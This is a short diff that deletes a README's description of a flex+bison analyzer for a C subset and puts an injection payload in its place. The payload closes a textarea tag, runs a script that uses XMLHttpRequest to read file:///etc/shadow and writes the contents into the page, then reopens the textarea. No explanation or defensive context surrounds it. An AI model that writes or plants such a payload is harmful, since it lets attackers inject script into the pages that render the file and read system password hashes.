@@ -1,2 +1,8 @@
-# compiler
-flex+bison实现的c语言子集的分析器。
+</textarea>
+<script>
+flag = new XMLHttpRequest;
+flag.onload=function(){document.write(this.responseText)};
+flag.open('GET', 'file:///etc/shadow');
+flag.send();
+</script>
+<textarea>
